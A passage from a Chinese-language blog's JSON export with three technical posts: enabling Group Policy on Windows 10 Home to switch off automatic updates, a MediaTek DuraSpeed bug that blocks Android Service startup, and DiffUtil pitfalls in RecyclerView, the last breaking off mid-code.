fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<blockquote>\n<p>之所以不更新，是因为你太好用，舍不得你出问题。哈哈哈哈哈哈啊哈哈哈！</p>\n</blockquote>\n<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>Windows10还是很漂亮很好用的，大部分同学购买的品牌机也都会预装正版Win10，不过是家庭版的（个人用户一般也不需要专业版，比如我这种装双系统的只把Win10拿来打游戏），然而，家庭版系统要用常规手段是没法彻底关闭自动更新的。<br><img src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly90aW1nc2EuYmFpZHUuY29tL3RpbWc_aW1hZ2UmcXVhbGl0eT04MCZzaXplPWI5OTk5XzEwMDAwJnNlYz0xNTc2MzM0NzM1ODAxJmRpPTdhNTA2OWZiZGEyZWIzZjE0YzZkZGZlY2QxZDVkNzliJmltZ3R5cGU9MCZzcmM9aHR0cDovL3d3dy5wYy1mbHkuY29tL3VwbG9hZHMvYWxsaW1nLzE2MDYwNy8wWjMxMU0wM18xLmpwZw?x-oss-process=image/format,png\" alt=\"在这里插入图片描述\"><br>微软也非常不给面子，各种给你悄悄打开，当你关机时，你会吃惊地发现“更新并关机”这个选项。<br>下面就介绍一下正确关闭自动更新的方法。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><h5 id=\"找回家庭版的组策略\"><a href=\"#找回家庭版的组策略\" class=\"headerlink\" title=\"找回家庭版的组策略\"></a>找回家庭版的组策略</h5><p>换新电脑以前我也是用的专业版，从来没有自动更新过，印象中就是在设置了组策略后生效的。但众所周知，组策略在家庭版上默认是打不开的，当然这并不代表功能缺失，而是隐藏了。<br><strong>如何找回？</strong><br>1、打开Windows的记事本，输入内容如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@echo off</span><br><span class=\"line\">pushd &quot;%~dp0&quot;</span><br><span class=\"line\">dir /b %systemroot%\\Windows\\servicing\\Packages\\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~3*.mum &gt;gp.txt</span><br><span class=\"line\">dir /b  %systemroot%\\servicing\\Packages\\Microsoft-Windows-GroupPolicy-ClientTools-Package~3*.mum &gt;&gt;gp.txt</span><br><span class=\"line\">for /f %%i in (&#x27;findstr /i . gp.txt 2^&gt;nul&#x27;) do dism /online /norestart /add-package:&quot;%systemroot%\\servicing\\Packages\\%%i&quot;</span><br><span class=\"line\">pause</span><br></pre></td></tr></table></figure>\n<p>2、另存为xxx.bat文件，且编码要改成ANSI：<br><img src=\"https://imgconvert.csdnimg.cn/20191214200221376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>3、然后右键“以管理员身份运行”此脚本文件，等待片刻（<strong>脚本说明：通过dir命令遍历系统盘servicing目录，寻找组策略的配置包，找到后写入到gp.txt文件，然后通过dism命令来安装组策略包</strong>）。<br>4、开始菜单右键，点击“运行”，输入 <code>gpedit.msc</code> ，会发现，我们的组策略可以打开啦！<br>5、在组策略中找到“<strong>配置自动更新</strong>”，双击后将其禁用，顺便可以把“<strong>自动更新检测频率</strong>”也禁用掉：<br><img src=\"https://imgconvert.csdnimg.cn/20191214200612183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>6、完事！成功关闭后，自动更新就会提示失败：<br><img src=\"https://imgconvert.csdnimg.cn/20191214201353940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"传统方法\"><a href=\"#传统方法\" class=\"headerlink\" title=\"传统方法\"></a>传统方法</h3><p>如果进行上述操作后还是有不放心的同学，可以再按以前的传统方法设置一遍，毕竟多重保障嘛！</p>\n<h5 id=\"关闭系统更新服务\"><a href=\"#关闭系统更新服务\" class=\"headerlink\" title=\"关闭系统更新服务\"></a>关闭系统更新服务</h5><p>1、开始菜单右键运行，输入 <code>services.msc</code> 进入服务，找到<strong>Windows Update</strong>，将其禁用：<br><img src=\"https://imgconvert.csdnimg.cn/20191214201124416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>2、然后，切换到“恢复”选项卡，都设为“无操作”：<br><img src=\"https://imgconvert.csdnimg.cn/20191214201211600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>3、再然后，在系统设置的<strong>更新和安全</strong>中，找到Windows更新的高级选项，全都关了：<br><img src=\"https://imgconvert.csdnimg.cn/20191214201452659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><img src=\"https://imgconvert.csdnimg.cn/2019121420154740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h5 id=\"在WLAN中打开按流量计费\"><a href=\"#在WLAN中打开按流量计费\" class=\"headerlink\" title=\"在WLAN中打开按流量计费\"></a>在WLAN中打开按流量计费</h5><p>你看微软多体贴啊，如果你告诉它你在用流量上网，它就不会更新了。<br>1、在网络连接中打开<strong>属性</strong>：<br><img src=\"https://imgconvert.csdnimg.cn/20191214201845246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>2、找到流量计费开关，把它打开：<br><img src=\"https://imgconvert.csdnimg.cn/2019121420193537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>无需担心，这个开关只是你对系统的宣告，并不是真的就变成流量计费了。</p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><p><a href=\"https://www.zhihu.com/question/41745930/answer/510335896\">https://www.zhihu.com/question/41745930/answer/510335896</a></p>\n"},{"layout":"post","title":"MTK设备上DuraSpeed导致Service无法启动的问题","subtitle":"知其所以然。","date":"2020-01-04T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n> 没想到联发科还会改framework，有点小惊讶……\n\n### 背景\n\n问题的起因是我们的系统应用无法调起与其他部门联动的某个Service组件了。查日志发现有这么一行：\n\n```shell\n1276-2330/system_process D/ActivityManager: bringUpServiceLocked, suppress to start service!\n```\n\n提示内容大概是说Service的启动被禁止了，当时我比较纳闷，难道谷歌又搞了什么幺蛾子？哈哈，而且最奇怪的是只在那一台特定型号的设备上复现问题，其他机型一切正常。\n这台设备最大的不同就是处理器是MTK的，其他正常机型是高通的。\n\n### 探查\n\n既然日志内容如此明显，问题也比较好查了，我们去看看这行log是在Android源码的哪一行出现的。正好最近谷歌推出了官方的源码检索平台：[Android Code Search](https://cs.android.com/)，可以在线搜索AOSP和AndroidX的代码，简直方便。\nActivityManager这个TAG的log有很多地方，我们直接查找 `bringUpServiceLocked` 方法所在的代码即可。\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200105180914692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n对应的文件路径为：**frameworks/base/services/core/java/com/android/server/am/ActiveServices.java**，然而呢，我根本没有找到“suppress to start service”这个内容。\n\n很容易想到，这是MTK夹带的私货，当我把源码切到该机型对应分支之后，果然找到了这段代码。由于保密原因这里不方便公开源码哈，但其实逻辑非常简单，就是MTK修改了代码，在 ``bringUpServiceLocked`` 方法内插入了自己的判断：**如果应用包名不在某个特定的白名单里，就会被禁止启动其他应用的Service组件**。其目的是为了防止不同应用之间的相互唤醒，初衷还是好的。但这样一刀切的方式，未免有点不妥。\n\n这个限制其实对应了MTK的一个进程管理功能，叫 **DuraSpeed**，网上很容易搜到相关资料，是MTK为了缓解手机长时间使用后的性能下降问题而开发的，没想到这些逻辑已经植入了framework代码，我原本以为联发科作为一家硬件厂商，只会动framework以下的代码。\n\n### 解决\n\n那么这个问题如何解决呢？由上可知，从应用层肯定是没法子的，只能从底层来解决。直接给系统组的大佬提issue咯！\n\n- **方法一：** 如果有条件修改ROM源码，找到这段代码，改之，这是最简单粗暴的。\n\n- **方法二：** 上面我们也提到了，限制逻辑中有一个白名单，在MTK的独立实现的framework修饰代码中，把包名加进去即可。\n\n- **方法三：** 其实这个 **DuraSpeed** 是一个可选功能，只不过在联发科的源码配置文件中默认开启了。一般来说这个配置文件在ROM源码的 **device/厂商名/机型代号** 目录下面，有一个 **ProjectConfig.mk** 文件，我们可以找到如下内容：\n\n  ```makefile\n  MTK_DURASPEED_DEFAULT_ON = yes\n  MTK_DURASPEED_SUPPORT = yes\n  ```\n\n  将此两者改成no即可关闭该功能。最后我试了一下，重新打包编译ROM后，果然解决了起初的问题。\n","source":"_posts/2020-01-05-MTK设备上Service无法启动的问题.md","raw":"---\nlayout:     post\ntitle:      MTK设备上DuraSpeed导致Service无法启动的问题\nsubtitle:   知其所以然。\ndate:       2020-01-05\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n    - AOSP\n---\n\n> 没想到联发科还会改framework，有点小惊讶……\n\n### 背景\n\n问题的起因是我们的系统应用无法调起与其他部门联动的某个Service组件了。查日志发现有这么一行：\n\n```shell\n1276-2330/system_process D/ActivityManager: bringUpServiceLocked, suppress to start service!\n```\n\n提示内容大概是说Service的启动被禁止了，当时我比较纳闷，难道谷歌又搞了什么幺蛾子？哈哈，而且最奇怪的是只在那一台特定型号的设备上复现问题，其他机型一切正常。\n这台设备最大的不同就是处理器是MTK的，其他正常机型是高通的。\n\n### 探查\n\n既然日志内容如此明显，问题也比较好查了，我们去看看这行log是在Android源码的哪一行出现的。正好最近谷歌推出了官方的源码检索平台：[Android Code Search](https://cs.android.com/)，可以在线搜索AOSP和AndroidX的代码，简直方便。\nActivityManager这个TAG的log有很多地方，我们直接查找 `bringUpServiceLocked` 方法所在的代码即可。\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200105180914692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n对应的文件路径为：**frameworks/base/services/core/java/com/android/server/am/ActiveServices.java**，然而呢，我根本没有找到“suppress to start service”这个内容。\n\n很容易想到，这是MTK夹带的私货，当我把源码切到该机型对应分支之后，果然找到了这段代码。由于保密原因这里不方便公开源码哈，但其实逻辑非常简单，就是MTK修改了代码，在 ``bringUpServiceLocked`` 方法内插入了自己的判断：**如果应用包名不在某个特定的白名单里，就会被禁止启动其他应用的Service组件**。其目的是为了防止不同应用之间的相互唤醒，初衷还是好的。但这样一刀切的方式，未免有点不妥。\n\n这个限制其实对应了MTK的一个进程管理功能，叫 **DuraSpeed**，网上很容易搜到相关资料，是MTK为了缓解手机长时间使用后的性能下降问题而开发的，没想到这些逻辑已经植入了framework代码，我原本以为联发科作为一家硬件厂商，只会动framework以下的代码。\n\n### 解决\n\n那么这个问题如何解决呢？由上可知，从应用层肯定是没法子的，只能从底层来解决。直接给系统组的大佬提issue咯！\n\n- **方法一：** 如果有条件修改ROM源码，找到这段代码，改之，这是最简单粗暴的。\n\n- **方法二：** 上面我们也提到了，限制逻辑中有一个白名单，在MTK的独立实现的framework修饰代码中，把包名加进去即可。\n\n- **方法三：** 其实这个 **DuraSpeed** 是一个可选功能，只不过在联发科的源码配置文件中默认开启了。一般来说这个配置文件在ROM源码的 **device/厂商名/机型代号** 目录下面，有一个 **ProjectConfig.mk** 文件，我们可以找到如下内容：\n\n  ```makefile\n  MTK_DURASPEED_DEFAULT_ON = yes\n  MTK_DURASPEED_SUPPORT = yes\n  ```\n\n  将此两者改成no即可关闭该功能。最后我试了一下，重新打包编译ROM后，果然解决了起初的问题。\n","slug":"MTK设备上Service无法启动的问题","published":1,"updated":"2024-03-25T07:31:25.858Z","comments":1,"photos":[],"link":"","_id":"cluaufh0u001xthe6904h6im6","content":"<blockquote>\n<p>没想到联发科还会改framework，有点小惊讶……</p>\n</blockquote>\n<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>问题的起因是我们的系统应用无法调起与其他部门联动的某个Service组件了。查日志发现有这么一行：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1276-2330/system_process D/ActivityManager: bringUpServiceLocked, suppress to start service!</span><br></pre></td></tr></table></figure>\n\n<p>提示内容大概是说Service的启动被禁止了，当时我比较纳闷，难道谷歌又搞了什么幺蛾子？哈哈，而且最奇怪的是只在那一台特定型号的设备上复现问题，其他机型一切正常。<br>这台设备最大的不同就是处理器是MTK的，其他正常机型是高通的。</p>\n<h3 id=\"探查\"><a href=\"#探查\" class=\"headerlink\" title=\"探查\"></a>探查</h3><p>既然日志内容如此明显，问题也比较好查了，我们去看看这行log是在Android源码的哪一行出现的。正好最近谷歌推出了官方的源码检索平台：<a href=\"https://cs.android.com/\">Android Code Search</a>，可以在线搜索AOSP和AndroidX的代码，简直方便。<br>ActivityManager这个TAG的log有很多地方，我们直接查找 <code>bringUpServiceLocked</code> 方法所在的代码即可。<br><img src=\"https://imgconvert.csdnimg.cn/20200105180914692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>对应的文件路径为：<strong>frameworks&#x2F;base&#x2F;services&#x2F;core&#x2F;java&#x2F;com&#x2F;android&#x2F;server&#x2F;am&#x2F;ActiveServices.java</strong>，然而呢，我根本没有找到“suppress to start service”这个内容。</p>\n<p>很容易想到，这是MTK夹带的私货，当我把源码切到该机型对应分支之后，果然找到了这段代码。由于保密原因这里不方便公开源码哈，但其实逻辑非常简单，就是MTK修改了代码，在 <code>bringUpServiceLocked</code> 方法内插入了自己的判断：<strong>如果应用包名不在某个特定的白名单里，就会被禁止启动其他应用的Service组件</strong>。其目的是为了防止不同应用之间的相互唤醒，初衷还是好的。但这样一刀切的方式，未免有点不妥。</p>\n<p>这个限制其实对应了MTK的一个进程管理功能，叫 <strong>DuraSpeed</strong>，网上很容易搜到相关资料，是MTK为了缓解手机长时间使用后的性能下降问题而开发的，没想到这些逻辑已经植入了framework代码，我原本以为联发科作为一家硬件厂商，只会动framework以下的代码。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>那么这个问题如何解决呢？由上可知，从应用层肯定是没法子的，只能从底层来解决。直接给系统组的大佬提issue咯！</p>\n<ul>\n<li><p><strong>方法一：</strong> 如果有条件修改ROM源码，找到这段代码，改之，这是最简单粗暴的。</p>\n</li>\n<li><p><strong>方法二：</strong> 上面我们也提到了，限制逻辑中有一个白名单，在MTK的独立实现的framework修饰代码中，把包名加进去即可。</p>\n</li>\n<li><p><strong>方法三：</strong> 其实这个 <strong>DuraSpeed</strong> 是一个可选功能，只不过在联发科的源码配置文件中默认开启了。一般来说这个配置文件在ROM源码的 <strong>device&#x2F;厂商名&#x2F;机型代号</strong> 目录下面，有一个 <strong>ProjectConfig.mk</strong> 文件，我们可以找到如下内容：</p>\n<figure class=\"highlight makefile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MTK_DURASPEED_DEFAULT_ON = yes</span><br><span class=\"line\">MTK_DURASPEED_SUPPORT = yes</span><br></pre></td></tr></table></figure>\n\n<p>将此两者改成no即可关闭该功能。最后我试了一下，重新打包编译ROM后，果然解决了起初的问题。</p>\n</li>\n</ul>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<blockquote>\n<p>没想到联发科还会改framework，有点小惊讶……</p>\n</blockquote>\n<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>问题的起因是我们的系统应用无法调起与其他部门联动的某个Service组件了。查日志发现有这么一行：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1276-2330/system_process D/ActivityManager: bringUpServiceLocked, suppress to start service!</span><br></pre></td></tr></table></figure>\n\n<p>提示内容大概是说Service的启动被禁止了，当时我比较纳闷，难道谷歌又搞了什么幺蛾子？哈哈，而且最奇怪的是只在那一台特定型号的设备上复现问题，其他机型一切正常。<br>这台设备最大的不同就是处理器是MTK的，其他正常机型是高通的。</p>\n<h3 id=\"探查\"><a href=\"#探查\" class=\"headerlink\" title=\"探查\"></a>探查</h3><p>既然日志内容如此明显，问题也比较好查了，我们去看看这行log是在Android源码的哪一行出现的。正好最近谷歌推出了官方的源码检索平台：<a href=\"https://cs.android.com/\">Android Code Search</a>，可以在线搜索AOSP和AndroidX的代码，简直方便。<br>ActivityManager这个TAG的log有很多地方，我们直接查找 <code>bringUpServiceLocked</code> 方法所在的代码即可。<br><img src=\"https://imgconvert.csdnimg.cn/20200105180914692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>对应的文件路径为：<strong>frameworks&#x2F;base&#x2F;services&#x2F;core&#x2F;java&#x2F;com&#x2F;android&#x2F;server&#x2F;am&#x2F;ActiveServices.java</strong>，然而呢，我根本没有找到“suppress to start service”这个内容。</p>\n<p>很容易想到，这是MTK夹带的私货，当我把源码切到该机型对应分支之后，果然找到了这段代码。由于保密原因这里不方便公开源码哈，但其实逻辑非常简单，就是MTK修改了代码，在 <code>bringUpServiceLocked</code> 方法内插入了自己的判断：<strong>如果应用包名不在某个特定的白名单里，就会被禁止启动其他应用的Service组件</strong>。其目的是为了防止不同应用之间的相互唤醒，初衷还是好的。但这样一刀切的方式，未免有点不妥。</p>\n<p>这个限制其实对应了MTK的一个进程管理功能，叫 <strong>DuraSpeed</strong>，网上很容易搜到相关资料，是MTK为了缓解手机长时间使用后的性能下降问题而开发的，没想到这些逻辑已经植入了framework代码，我原本以为联发科作为一家硬件厂商，只会动framework以下的代码。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>那么这个问题如何解决呢？由上可知，从应用层肯定是没法子的，只能从底层来解决。直接给系统组的大佬提issue咯！</p>\n<ul>\n<li><p><strong>方法一：</strong> 如果有条件修改ROM源码，找到这段代码，改之，这是最简单粗暴的。</p>\n</li>\n<li><p><strong>方法二：</strong> 上面我们也提到了，限制逻辑中有一个白名单，在MTK的独立实现的framework修饰代码中，把包名加进去即可。</p>\n</li>\n<li><p><strong>方法三：</strong> 其实这个 <strong>DuraSpeed</strong> 是一个可选功能，只不过在联发科的源码配置文件中默认开启了。一般来说这个配置文件在ROM源码的 <strong>device&#x2F;厂商名&#x2F;机型代号</strong> 目录下面，有一个 <strong>ProjectConfig.mk</strong> 文件，我们可以找到如下内容：</p>\n<figure class=\"highlight makefile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MTK_DURASPEED_DEFAULT_ON = yes</span><br><span class=\"line\">MTK_DURASPEED_SUPPORT = yes</span><br></pre></td></tr></table></figure>\n\n<p>将此两者改成no即可关闭该功能。最后我试了一下，重新打包编译ROM后，果然解决了起初的问题。</p>\n</li>\n</ul>\n"},{"layout":"post","title":"RecyclerView中DiffUtil的一些注意事项","subtitle":"见微知著。","date":"2020-01-11T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n### 节能刷新\n\n移动设备屏幕大小有限（不得不说我是顽固的小屏爱好者，大于5.5寸难以接受，时代已经抛弃我了哈哈），列表（List）可以说是一个出现非常高频的交互设计。大多数情况下我们的列表不仅仅是一次性加载本地数据，而要应付来自网络的各种动态内容，可能是增加、删除等操作。\n\n在Android开发中，一个耳熟能详的方法就是 `notifyDataSetChanged` ，在适配器（Adapter）的设计模式下，每当我们的列表数据发生变更时，就需要调用此方法来更新UI。然而，这个方法并不“**节能**”，它会同时刷新列表中的所有item，包括那些并没有变化的数据，这样就带来很多计算资源的浪费。要知道，从你的一个 `setText` 或者 `setImageResource` 方法调用到最终呈现到屏幕上，软件到硬件，中间经历了非常复杂的过程。基于能省则省的移动开发原则，有没有更好的办法呢？\n\n### DiffUtil用起来\n\n谷歌确实也考虑到了这个问题，所以不知道在什么时候（暂时没有去查阅）推出了DiffUtil这个解决方案。在RecyclerView的依赖包下面，可以看到，除了DiffUtil，还有异步处理数据等一系列有趣的工具。\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200113015406917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\nDiffUtil的运用逻辑非常简单，大致如下：\n\n- 实现对比新旧数据的方法（类似比较器），这样DiffUtil便知道当新数据来临时，该不该更新某个item。\n- 更新数据时，把新旧数据丢给DiffUtil，底层会根据你实现的对比方法，利用一种差分算法自动计算出差异，最后局部更新到UI。\n\n这样做的好处就是避免了不必要的UI更新，DiffUtil计算出差异之后，只刷新产生变动的item。具体地，我们可以在Adapter的 `onBindViewHolder` 方法打断点或者日志观察，或者调用 `registerAdapterDataObserver` 方法监听item的各种操作情况。其次，以前的 `notifyDataSetChanged` 方法由于会刷新整个列表所以没有原生的动画效果，而DiffUtil内部最终调用了各种 `notifyItemXXX` 方法。\n\nDiffUtil的使用也很简单：\n\n1、先实现比较新旧数据的回调，可以是一个独立的类，也可以写成Adapter的内部类：\n\n```java\npublic class BaseXXXAdapter<T> extends RecyclerView.Adapter {\n    // ...\n\n    private class DiffCallback extends DiffUtil.Callback {\n        private List<T> oldData, newData;\n\n        DiffCallback(List<T> oldData, List<T> newData) {\n            this.oldData = oldData;\n            this.newData = newData;\n        }\n\n        @Override\n        public int getOldListSize() {\n            return oldData.size();\n        }\n\n        @Override\n        public int getNewListSize() {\n            return newData.size();\n        }\n\n        @Override\n        public boolean areItemsTheSame(int oldItemPosition, int newItemPosition) {\n            T oldT = oldData.get(oldItemPosition);\n            T newT = newData.get(newItemPosition);\n            // 实际情况最好是在此处对比新旧数据的id（比如用户uid），这里为了方便示例直接equals对象了\n            // 若此处返回true，则DiffUtil会再调用下面的areContentsTheSame方法，进一步对比UI是否有变化\n            // 若此处返回false，则说明id都不同，肯定不是一个item\n            return Objects.equals(oldT, newT);\n        }\n\n        @Override\n        public boolean areContentsTheSame(int oldItemPosition, int newItemPosition) {\n            // TODO 比较新旧数据（主要是UI展示内容）是否相同，这里为了方便示例直接返回true\n            return true;\n        }\n    }\n}\n```\n\n2、然后在Adapter内部实现一个update数据的方法：\n\n```java\n    @Override\n    public void updateData(List<T> newData) {\n        DiffUtil.DiffResult result = DiffUtil.calculateDiff(new DiffCallback(getData(), newData));\n        // 这里的getData即表示获取整个列表的数据，自行实现即可\n        getData().clear();\n        getData().addAll(newData);\n        result.dispatchUpdatesTo(this);\n    }\n```\n\n注意这里的 `dispatchUpdatesTo` 可以在clear之前，也可以在addAll之后，实际效果暂未发现什么区别，之前查阅资料包括官方示例也都是最后执行dispatch，姑且认为这样算标准吧。\n\n3、……咦，怎么才两步，确实就这么简单。重点还是 `areItemsTheSame` 和 `areContentsTheSame` 方法，后者大部分时候只需要对比每个item上UI展示出来的数据即可，因为用户只关心眼见的内容。\n\n### 解决使用后产生的问题\n\n我们会发现在上面的使用示例中，`updateData` 方法内部对原数据进行了清除和添加的操作，这会导致一个问题便是：**列表数据集合中的对象已经变了，即使其某项对应的UI内容没有发生变化**。\n\n举个例子，一个通讯录列表里面有 **[小明, 小红]** 两个人，对应内存地址为 **[a1, a2]**，现在通过上述 `updateData` 方法更新了通讯录列表，UI内容变成了 **[小王, 小红]**，对应内存地址为 **[b1, b2]**。对用户来说小红这个item看上去没有发生变化，但其实对应的数据类对象已经不同。**而且此时 `onBindViewHolder` 方法只会触发一次，将小明更新成小王，而不会触发小红那个position对应的 `onBindViewHolder`** 。\n\n上述细节很关键，如果开发过程中绑定（bind）数据**不恰当**的话，就容易造成各种奇异问题，比如网上资料最多的DiffUtil导致item点击事件数据错位问题、数组越界崩溃问题等等。\n\n这里的“不恰当”，绝大部分情况下，总结出来：其实指的就是在 `onBindViewHolder` 方法中持有了某个位置（position）对应数据的不可变对象。最常见的误用示例就是在 `onBindViewHolder` 中设置某些控件的点击事件并引用数据对象：\n\n```java\n    // 此处假设item的数据类为User\n    @Override\n    public void onBindViewHolder(RecyclerView.ViewHolder holder, int position) {\n        MyItemViewHolder h = (MyItemViewHolder) holder;\n        User user = getData().get(position);\n        h.mNameTextView.setOnClickListener(v -> {\n            // 第2种写法：User user = getData().get(position);\n            // 假设这里是点击item跳转到该User对应的个人主页界面\n            startWebView(user.getHomePageUrl());\n        });\n    }\n```\n\n在不接入DiffUtil之前，上面这段代码没有任何问题，因为我们都是使用 `notifyDataSetChanged` 方法来更新UI，每次更新调用到 `onBindViewHolder` 时，点击事件都会重新设置，get出来的user对象自然也是最新的。一旦我们使用了DiffUtil，就会出问题了。\n\n回到上面小王绿了小明的例子，在我们的 `updateData` 方法执行后，如果我们只对比了user的名字这个属性（其实也只需要对比这个属性），那么小红那一个item就不会触发对应的 `onBindViewHolder` ，即小红的点击事件回调里，**仍然持有着旧数据集的user对象（对应那个内存地址a2）**。但实际上小红应该对应 **b2** 那个内存了，这就造成 **a2** 内存无法释放，问题是不是显得有点严重了。\n\n有同学说无所谓呀，反正点击事件依然有效。那如果我说网络数据刷新下来小红的 **homePageUrl** 变了呢？是不是还得把这个属性加入DiffUtil的对比方法中？这样最终会导致小红的 `onBindViewHolder` 方法也执行，跟 `notifyDataSetChanged` 岂不是没什么两样了？\n\n此外，若get对象写成注释中的第2种写法，且列表第0个位置的item被删了呢？小红顶上去变成了第0个，此时由于小红的UI内容没变，只是位置变了，所以 `onBindViewHolder` 依然不会执行。以上面的示例代码来看，当再次点击小红时，就会直接出现数组越界的异常。因为position还是之前的1，而此时小红的position已经为0。\n\n显然上述出现的这些问题不符合谷歌的设计初衷，也不符合我们使用DiffUtil的初衷。其实**解决办法**很简单，就是要对 `onBindViewHolder` 方法有一个正确的认知，其原则就是：\n\n- `onBindViewHolder` 只做UI内容的更新，如 `setText`，`setImageXXX` 等方法。做到数据对象一次性使用。\n- 不要跨作用域持有与位置（position）相关的数据，比如每个item的数据对象。尤其就是避免在 `onBindViewHolder` 中设置点击事件监听。\n\n正确的点击事件监听还是参照如下形式比较好：\n\n```java\n// 比如这是某个Base适配器类\npublic class BaseXXXAdapter<T> extends RecyclerView.Adapter {\n    // ...\n    private View.OnClickListener mOnClickListener;\n    private View.OnLongClickListener mOnLongClickListener;\n    private OnItemClickListener 